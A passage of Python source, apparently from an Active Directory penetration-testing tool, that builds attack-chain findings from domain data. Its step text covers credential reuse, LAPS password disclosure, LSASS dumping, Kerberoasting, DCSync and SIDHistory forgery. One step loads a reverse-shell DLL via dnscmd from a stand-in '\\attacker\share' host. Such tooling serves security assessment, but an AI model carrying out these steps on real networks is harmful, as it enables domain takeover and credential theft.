            if username and cred:
                title = f"Creds in description: {user} → {username}:{cred}"
            elif cred:
                title = f"Creds in description: {user} ({cred})"
            else:
                title = f"Creds in description: {user} [{ptype}]"

            self._add({
                "id": f"desc_pwd_{user.upper()}_{ptype}_{hashlib.md5(str(cred).encode()).hexdigest()[:8]}",
                "type": "DESCRIPTION_CREDENTIAL",
                "severity": severity,
                "title": title,
                "description": f"User {user} has a potential password/credential in their "
                               f"description field [{ptype}]: \"{desc_snippet}\". "
                               "Description fields are often readable by any authenticated user "
                               "(and sometimes anonymously). This is a common helpdesk/admin mistake.",
                "steps": [
                    f"Review description of {user}: \"{f.get('description', '')[:120]}\"",
                    f"Try credential: {cred} for user {username or user}",
                    "Authenticate via LDAP / SMB / WinRM / RDP",
                    "If DA: full domain compromise. If not: lateral movement."
                ],
                "nodes": [user] + ([username] if username else []),
                "edges": [(user, "CREDENTIAL", "DescriptionLeak")]
            })

    def _gpo_credential_chains(self):
        """GPO/SYSVOL credential hunting chains — cpassword, script creds, sensitive files."""
        gpo_findings = self.data.get("gpo_contents", [])
        if not gpo_findings:
            return
        crit_types = {"cpassword_decrypted"}
        high_types = {"script_label", "script_full_creds", "script_ps_variable", "script_net_user",
                      "xml_label", "xml_full_creds"}
        med_types = {"sensitive_file", "registry_autorun"}

        for f in gpo_findings:
            ftype = f.get("type", "?")
            cred = f.get("credential", "")[:48]
            fpath = f.get("gpo_path", "?")
            ffile = f.get("file", "?")

            if ftype in crit_types:
                severity = "CRITICAL"
            elif ftype in high_types:
                severity = "HIGH"
            elif ftype in med_types:
                severity = "MEDIUM"
            else:
                severity = "HIGH"

            title_map = {
                "cpassword_decrypted": f"GPP cpassword decrypted: {cred} in {ffile}",
                "sensitive_file": f"Sensitive file in GPO: {fpath}",
                "registry_autorun": f"Registry autorun key in GPO: {fpath}",
            }
            title = title_map.get(ftype, f"GPO credential [{ftype}]: {cred} in {ffile}")

            self._add({
                "id": f"gpo_cred_{hashlib.md5(str(fpath).encode()).hexdigest()[:8]}_{hashlib.md5(str(cred).encode()).hexdigest()[:6]}",
                "type": "GPO_CREDENTIAL",
                "severity": severity,
                "title": title,
                "description": f"GPO file {fpath} on DC {f.get('dc', '?')} contains "
                               f"potential credential [{ftype}]: {cred}. "
                               "SYSVOL is readable by all authenticated users — "
                               "this is a common lateral movement vector.",
                "steps": [
                    f"Access \\\\{f.get('dc', 'DC')}\\SYSVOL\\{fpath}",
                    f"Extract credential: {cred}",
                    "Use for lateral movement or privilege escalation",
                ],
                "nodes": ["SYSVOL", f.get("dc", "DC")],
                "edges": [("SYSVOL", f.get("dc", "DC"), "GPO_Leak")]
            })

    def _validated_credential_chains(self):
        """Chains for actually tested-and-valid credentials."""
        validated = self.data.get("validated_credentials", [])
        for v in validated:
            if not v.get("valid"):
                continue
            uname = v["username"]
            is_da = v.get("is_da", False)
            method = v.get("method", "LDAP")
            self._add({
                "id": f"valid_cred_{uname.upper()}",
                "type": "VALIDATED_CREDENTIAL",
                "severity": "CRITICAL" if is_da else "HIGH",
                "title": f"Valid credential: {uname}"
                         f"{' (DA!)' if is_da else ''} via {method}",
                "description": f"Credentials for {uname} validated against {method}. "
                               f"{'Full domain compromise possible.' if is_da else 'Lateral movement possible.'}",
                "steps": [
                    f"Authenticate as {uname} via {method}",
                    *(["DCSync → full domain compromise"] if is_da
                      else ["Enumerate accessible resources", "Lateral movement"]),
                ],
                "nodes": [uname] + (["DOMAIN ADMIN"] if is_da else []),
                "edges": [(uname, "DOMAIN ADMIN", "ValidCred") if is_da
                          else (uname, "VALIDATED", "ValidCred")]
            })


    def _ou_acl_chains(self):
        """OU seviyesinde GenericAll vb. olan hesaplar → OU'daki tum objelere erisim."""
        for ou_entry in self.data.get("ou_acls", []):
            for ace in ou_entry.get("dangerous_aces", []):
                self._add({
                    "id": f"ou_acl_{ace['principal'].upper()}_{ou_entry['ou']}",
                    "type": "OU_ACL_ABUSE",
                    "severity": "CRITICAL" if ace["right"] == "GenericAll" else "HIGH",
                    "title": f"OU ACL: {ace['principal']} has {ace['right']} on OU {ou_entry['ou']}",
                    "description": f"{ace['principal']} has {ace['right']} on OU "
                                   f"{ou_entry['ou']} ({ou_entry.get('object_count', '?')} objects). "
                                   f"Can reset passwords / modify all objects in this OU.",
                    "steps": [
                        f"Compromise {ace['principal']}",
                        f"With {ace['right']} on {ou_entry['ou']}: "
                        + ("reset any user password in OU" if ace["right"] == "GenericAll"
                           else "modify group memberships / write properties"),
                        "Escalate to DA if any DA account is in this OU",
                    ],
                    "nodes": [ace["principal"], ou_entry["ou"], "DOMAIN ADMIN"],
                    "edges": [(ace["principal"], ou_entry["ou"], ace["right"])],
                })

    def _dns_admins_chains(self):
        """DNSAdmins grubu uyesi → DC'de SYSTEM (dns.exe DLL injection)."""
        dns_admins = [a for a in self.data.get("admins", [])
                      if a.get("group") == "DNSAdmins"]
        if not dns_admins:
            return
        dcs = [c["name"] for c in self.data.get("computers", []) if c.get("is_dc")]
        for a in dns_admins:
            for dc in dcs[:1]:  # one DC is sufficient
                self._add({
                    "id": f"dnsadmin_{a['member_name'].upper()}_{dc}",
                    "type": "DNSADMINS_ABUSE",
                    "severity": "CRITICAL",
                    "title": f"DNSAdmins → DC SYSTEM: {a['member_name']} on {dc}",
                    "description": f"{a['member_name']} is member of DNSAdmins. "
                                   f"Can load arbitrary DLL via dnscmd/dnsserver RPC → SYSTEM on {dc}.",
                    "steps": [
                        f"Compromise {a['member_name']}",
                        "Create malicious DLL (e.g., msfvenom -p windows/x64/shell_reverse_tcp)",
                        f"dnscmd {dc} /config /serverlevelplugindll \\\\attacker\\share\\evil.dll",
                        "Restart DNS service or wait for replication → SYSTEM shell on DC",
                    ],
                    "nodes": [a["member_name"], dc, "DOMAIN ADMIN"],
                    "edges": [(a["member_name"], dc, "DNSAdmins"),
                              (dc, "DOMAIN ADMIN", "SYSTEM")]
                })

    def _cross_forest_chains(self):
        """Cross-forest: trusts without SID filtering → foreign admin access."""
        for t in self.data.get("trusts", []):
            if not t.get("sid_filtering", True):
                self._add({
                    "id": f"cross_forest_{t['name']}",
                    "type": "CROSS_FOREST_SID_ABUSE",
                    "severity": "CRITICAL",
                    "title": f"Cross-forest: SID filtering OFF on {t['name']}",
                    "description": f"Trust to {t['name']} has SID filtering disabled. "
                                   f"Golden ticket SIDHistory → Enterprise Admin in this forest.",
                    "steps": [f"Compromise {t['name']}", "Forged SIDHistory ticket → cross-forest EA"],
                    "nodes": [t["name"], "ENTERPRISE ADMIN"],
                    "edges": [(t["name"], "ENTERPRISE ADMIN", "TrustSIDHistory")]
                })
            if t.get("uses_rc4"):
                self._add({
                    "id": f"trust_rc4_{t['name']}",
                    "type": "CROSS_FOREST_RC4",
                    "severity": "HIGH",
                    "title": f"Weak trust crypto (RC4): {t['name']}",
                    "description": "RC4-enabled trust → faster Kerberoasting across boundary.",
                    "steps": ["Enumerate SPNs in trusted domain", "TGS crack with RC4"],
                    "nodes": [t["name"]],
                })

    def _mssql_chains(self):
        """MSSQL servis hesabi → Kerberoast → DA zinciri."""
        da_set = self.da_users
        for m in self.data.get("mssql_servers", []):
            sa = m.get("service_account", "")
            if sa.upper() in da_set:
                self._add({
                    "id": f"mssql_da_{sa.upper()}",
                    "type": "MSSQL_DA_SERVICE",
                    "severity": "CRITICAL",
                    "title": f"MSSQL DA service account: {sa} on {m['host']}",
                    "description": f"MSSQL service account {sa} is DA. Kerberoast → direct DA compromise.",
                    "steps": [f"GetUserSPNs.py for {sa}", "Kerberoast → crack offline", "DA access"],
                    "nodes": [sa, "DOMAIN ADMIN"],
                    "edges": [(sa, "DOMAIN ADMIN", "Kerberoast")]
                })
            else:
                self._add({
                    "id": f"mssql_{sa.upper()}",
                    "type": "MSSQL_SERVICE",
                    "severity": "MEDIUM",
                    "title": f"MSSQL service: {sa} on {m['host']}",
                    "description": f"Kerberoast {sa} for MSSQL access → potential linked server escalation.",
                    "steps": [f"GetUserSPNs.py for {sa}", "Crack → MSSQL login", "Enumerate linked servers → xp_cmdshell"],
                    "nodes": [sa, m["host"]],
                })

    def _sccm_chains(self):
        """SCCM NAA hesabi → tum clientlara local admin."""
        for s in self.data.get("sccm", []):
            sa = s.get("service_account", "")
            if sa:
                self._add({
                    "id": f"sccm_naa_{sa.upper()}",
                    "type": "SCCM_NAA_ACCOUNT",
                    "severity": "CRITICAL",
                    "title": f"SCCM service account: {sa}",
                    "description": f"SCCM/NAA account {sa} may have local admin on all SCCM clients. "
                                   "Compromise → broad lateral movement.",
                    "steps": [f"Compromise {sa}", "Enumerate SCCM clients", "Lateral movement to all managed systems"],
                    "nodes": [sa, "SCCM"],
                })

    def _laps_password_chains(self):
        """LAPS sifresi okunabilen bilgisayarlar + DA session."""
        da_set = self.da_users
        for lp in self.data.get("laps_passwords", []):
            comp = lp["computer"].upper()
            pwd = lp.get("password", "")[:20]
            da_here = [s["user"] for s in self.all_sessions
                       if s["host"].upper() == comp and s["user"].upper() in da_set]
            if da_here:
                self._add({
                    "id": f"laps_da_{comp}",
                    "type": "LAPS_DA_CHAIN",
                    "severity": "CRITICAL",
                    "title": f"LAPS read + DA session: {comp} ({pwd}...)",
                    "description": f"LAPS password readable for {comp}. DA(s) {','.join(da_here)} have session → credential dump.",
                    "steps": [f"LAPS password for {comp}: {lp['password']}",
                              "Local admin via LAPS", "Dump LSASS → extract DA credentials"],
                    "nodes": [comp, "DOMAIN ADMIN"],
                    "edges": [(comp, "DOMAIN ADMIN", "LAPS_to_DA")]
                })
            else:
                self._add({
                    "id": f"laps_{comp}",
                    "type": "LAPS_READ",
                    "severity": "HIGH",
                    "title": f"LAPS password readable: {comp} ({pwd}...)",
                    "description": f"LAPS password for {comp} is readable. Local admin on this system.",
                    "steps": [f"Use LAPS password: {lp['password']}", f"Local admin on {comp}"],
                    "nodes": [comp],
                })

